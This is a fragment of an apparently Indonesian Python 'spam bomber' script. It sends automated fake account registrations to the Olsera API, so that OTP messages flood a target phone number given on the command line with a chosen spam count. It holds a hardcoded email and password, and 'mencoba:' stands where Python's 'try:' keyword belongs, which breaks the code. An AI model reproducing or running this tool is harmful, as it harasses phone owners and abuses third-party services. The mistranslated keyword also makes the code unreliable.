	ol2=json.dumps({"name":"AmmarExecuted","email":"margeng84@gmail.com","password":"@mm4rgans","phone":"+62"+nomor,"phone_format" :nomor,"name_toko":"","url_id":"","business_type_id":"","service_type_id":3,"country_id":"ID","city_id":"","state_id":" ","pos_resto_mode":0,"i_agree":"true","address":"","id":"null","tokenMiscall":"","use_otp_type":3})

	ol3=requests.post("https://api-dash.olsera.co.id/api/admin/v1/en/register",headers=ol,data=ol2).text

	print (f"{W}[{G}✓{W}] Berhasil Dikirim Brutal SCW")

mencoba:

	logo()

except IndexError:

	exit('   \033[0;37m[\033[0;31m!\033[0;37m] Example \033[0;31m: \033[0;37mpython %s \033[0;32m<nomor> <jumlahspam>\n'%(sys.argv[0]))

except requests.exceptions.ConnectionError:

	exit('\033[0;37m[\033[0;31m!\033[0;37m] \033[0;37mKoneksi Internet Error')

except KeyboardInterrupt:

	exit(f"{W}Program Dihentikan{R} ! !")
